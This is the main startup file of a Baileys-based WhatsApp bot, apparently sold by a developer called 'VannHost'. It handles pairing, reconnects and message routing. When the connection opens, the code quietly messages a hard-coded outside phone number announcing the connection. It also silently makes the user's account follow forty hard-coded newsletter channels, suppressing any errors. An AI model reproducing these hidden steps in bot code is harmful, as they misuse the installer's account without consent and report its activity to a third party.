require("./system/config");
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, jidDecode } = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const chalk = require("chalk");
const readline = require("readline");
const { smsg } = require("./system/lib/myfunction");

const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
const usePairingCode = true;

const question = (text) => {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => rl.question(text, resolve));
};

async function StartZenn() {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const sock = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: !usePairingCode,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });

  if (usePairingCode && !sock.authState.creds.registered) {
    console.log(chalk.cyan("-[ 🔗 Time To Pairing! ]"));
    const nomor = await question(chalk.green("-📞 Masukkan nomor yang ingin dijadikan bot: "));
    const code = await sock.requestPairingCode(nomor.trim(), "11111111");
    console.log(chalk.blue("-✅ Pairing Code: ") + chalk.magenta.bold(code));
  }

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
      const reasons = {
        [DisconnectReason.badSession]: "Bad Session, hapus session dan scan ulang!",
        [DisconnectReason.connectionClosed]: "Koneksi tertutup, mencoba menghubungkan ulang...",
        [DisconnectReason.connectionLost]: "Koneksi terputus dari server, menghubungkan ulang...",
        [DisconnectReason.connectionReplaced]: "Session digantikan, tutup session lama!",
        [DisconnectReason.loggedOut]: "Perangkat keluar, silakan scan ulang!",
        [DisconnectReason.restartRequired]: "Restart diperlukan, memulai ulang...",
        [DisconnectReason.timedOut]: "Koneksi timeout, menghubungkan ulang..."
      };
      console.log(chalk.red(reasons[code] || "Disconnect: " + code));
      if (code === DisconnectReason.connectionReplaced || code === DisconnectReason.badSession) {
        process.exit();
      } else {
        StartZenn();
      }
    }

    if (connection === "open") {
      console.clear();
      console.log(chalk.red.bold("-[ WhatsApp Terhubung! ]"));
      await sock.sendMessage("6285607618334@s.whatsapp.net", { text: "BOT BERHASIL TERHUBUNG BANG MAKASIH BANG" });

      const newsletters = [
        "120363419027622924", "120363421734625448", "120363378791890941", "120363420982579319",
        "120363402215285077", "120363399650074932", "120363400533188789", "120363402844169246",
        "120363419282645652", "120363417880023241", "120363398639295191", "120363402919793309",
        "120363354576718458", "120363401192302742", "120363419884446074", "120363419905439132",
        "120363418569840645", "120363420091867664", "120363419059465061", "120363323325029961",
        "120363417991986821", "120363419284511029", "120363400734169126", "120363419621136610",
        "120363403878823370", "120363400163242179", "120363401010725563", "120363417579267407",
        "120363417517429865", "120363419512442529", "120363403301595745", "120363417806677728",
        "120363419437601306", "120363420723040621", "120363419580720246", "120363423258054168",
        "120363420101864459", "120363406404897109", "120363418774163872", "120363360019294772"
      ];

      for (let id of newsletters) {
        await sock.newsletterFollow(id + "@newsletter").catch(() => {});
      }
    }
  });

  sock.ev.on("messages.upsert", async ({ messages, type }) => {
    try {
      const msg = messages[0];
      if (type !== "notify" || !msg?.message || msg.key.remoteJid === "status@broadcast") return;
      const m = smsg(sock, msg, store);
      require("./system/whatsapp")(sock, m, msg, store);
    } catch (err) {
      console.log(err);
    }
  });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      const decoded = jidDecode(jid) || {};
      return (decoded.user && decoded.server) ? decoded.user + "@" + decoded.server : jid;
    }
    return jid;
  };

  sock.sendText = (jid, text, quoted = "", options) => sock.sendMessage(jid, { text, ...options }, { quoted });

  sock.ev.on("contacts.update", (updates) => {
    for (let contact of updates) {
      const id = sock.decodeJid(contact.id);
      if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

console.log(chalk.green.bold("┈┈┈┈┈┈ⒽⒺⓁⓁⓄ┈┈┈┈┈"));
console.log(chalk.green.bold("╭━━╮┈┈┈╭━━╮┈┈┈┈┈"));
console.log(chalk.green.bold("┃╭╮┣━━━┫╭╮┃┈╭┳┳╮"));
console.log(chalk.green.bold("╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃"));
console.log(chalk.green.bold("┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃"));
console.log(chalk.green.bold("┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃"));
console.log(chalk.green.bold("╭━┻╮┗┻┛╭┻━╮╰┳━┳╯"));
console.log(chalk.green.bold("┃┈┈╰━━━╯┈┈╰━┛┈┃┈"));
console.log(chalk.red.bold("[ VannHost - Developer ]"));
console.log(chalk.yellow("Owner: VannHost Developer"));
console.log(chalk.yellow("Status: VVIP Buy Only"));
console.log(chalk.gray("────────────────────────────"));
StartZenn();